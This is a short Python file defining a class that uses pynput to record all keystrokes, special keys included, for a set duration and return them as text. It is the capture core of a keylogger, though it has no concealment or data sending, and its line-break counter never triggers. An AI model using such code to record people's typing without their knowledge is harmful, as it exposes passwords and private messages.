from pynput import keyboard
import time

class KeyListener:
    def __init__(self):
        """
        Initializes the object.

        Args:
            self: The object instance.

        Returns:
            None
        """
        self.keys = []
        self.listener = None
      
    def on_press(self, key):
        """
        Adds the pressed key to the list of keys if it is a character key.

        Parameters:
            key (Key): The key that was pressed.

        Returns:
            None
        """
        try:
            cont = 0
            if hasattr(key, 'char'):
                self.keys.append(key.char)
                cont += 1
            elif hasattr(key, 'name') and key.name is not None:
                self.keys.append(f'[{key.name.upper()}]')
                cont += 1

            # Space between keys to improve readability
            if cont > 70:
                self.keys.append('\n')
                cont = 0
        except AttributeError as e:
            print(e)

    def start_listener(self):
        """
        Starts the listener thread.

        This function starts the listener by calling the `start` method.

        Parameters:
            None

        Returns:
            None
        """
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()  

    def stop_listener(self):
        """
        Stop the listener and join the listener thread.

        This function stops the listener and waits for the listener thread to finish execution.

        Parameters:
            None

        Returns:
            None
        """
        self.listener.stop()

    def read_keys(self, timeout=60):
        """
        Reads the keys from the listener for a specified duration.

        Args:
            timeout (float): The duration in seconds to wait for keys.
        
        Returns:
            str: A string containing all the keys read from the listener.
        """
        self.start_listener()
        time.sleep(timeout)
        self.stop_listener()

        return ''.join(self.keys)

    def get_keys(self):
        return ''.join(self.keys)
